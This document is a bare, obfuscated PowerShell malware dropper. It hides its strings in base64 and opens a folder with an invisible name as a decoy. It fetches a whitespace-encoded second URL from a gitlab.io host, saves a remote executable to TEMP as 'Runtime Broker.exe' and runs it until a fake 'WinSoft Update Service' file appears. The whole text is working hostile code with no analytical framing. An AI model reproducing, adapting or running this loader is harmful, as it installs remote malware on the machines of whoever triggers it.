$a = $(get-location).Path;$b = (${env:ProgramFiles(x86)}, ${env:ProgramFiles} -ne $null)[0];$c = $env:TEMP;$d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luU29mdCBVcGRhdGUgU2VydmljZVxweXRob253LmV4ZQ=="));$f = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9ldmgwMDEuZ2l0bGFiLmlvL3NyYy50eHQ="));$aa = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("44Wk"));$bb = $a + "\" + $aa + "\";$h = $b + "\" + $d;$mn = $c + "\Runtime Broker.exe";if (Test-Path -Path $bb -PathType Container) {ii $bb;$q = New-Object System.Net.WebClient;while (!(Test-Path $mn)) {try {$q.DownloadFile([System.Net.HttpWebRequest]::Create( -join ( -split (((New-Object System.Net.WebClient).DownloadString($f)) -replace " ", "1" -replace "`t", "0" -replace "\n", " ") | % { [char][convert]::toint32($_, 2) })).GetResponse().ResponseUri.AbsoluteUri, $mn);}catch [System.Net.WebException] {if ($_.Exception.Response.StatusCode) {exit}}catch {}Start-Sleep -s 5;}while (!(Test-Path $h)) {Start-Process -FilePath $mn -Wait;Start-Sleep -s 1;}}